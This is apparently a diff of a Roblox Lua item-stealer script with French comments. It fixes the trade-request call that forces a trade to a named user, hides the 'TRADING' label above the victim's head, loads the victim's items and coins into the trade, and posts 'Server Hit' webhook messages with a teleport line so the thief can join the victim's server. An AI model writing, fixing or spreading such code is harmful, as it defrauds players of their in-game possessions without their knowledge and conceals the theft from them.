@@ -75,7 +75,6 @@ end)
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
     if inTrade then
-        -- // SUPPRESSION DU "TRADING" AU DESSUS DE LA TÊTE
         task.spawn(function()
             if plr.Character then
                 for i = 1, 20 do
@@ -89,12 +88,15 @@ tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     end
 end)
 
--- // FONCTIONS DE TRADING (RÉSEAU)
+-- // FONCTIONS DE TRADING (CORRIGÉES)
 local function sendTradeRequest(user)
-    local target = game:GetService("Players"):WaitForChild(user)
+    local args = {
+        [1] = game:GetService("Players"):WaitForChild(user)
+    }
     repeat
         task.wait(0.1)
-        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer({target})
+        -- Utilisation de unpack(args) comme dans ton script d'origine
+        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
     until response == true
 end
 
@@ -168,7 +170,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["auth_token"] = auth_token, -- AJOUTÉ
+        ["auth_token"] = auth_token,
         ["username"] = webhookName,
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
@@ -213,7 +215,7 @@ local function SendMessage(list)
     end
 
     local data = {
-        ["auth_token"] = auth_token, -- AJOUTÉ
+        ["auth_token"] = auth_token,
         ["username"] = webhookName,
         ["embeds"] = {{
             ["title"] = "⚪ Server Hit 🎯",
@@ -285,7 +287,6 @@ if #itemsToSend > 0 then
                 addItemToTrade(item.itemType, item.ItemID)
             end
 
-            -- Ajout des tokens si présents
             local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
             local cleanedText = rawText:gsub("^%s*(.-)%s*$", "%1"):gsub("[^%d]", "")
             local tokensamount = tonumber(cleanedText) or 0
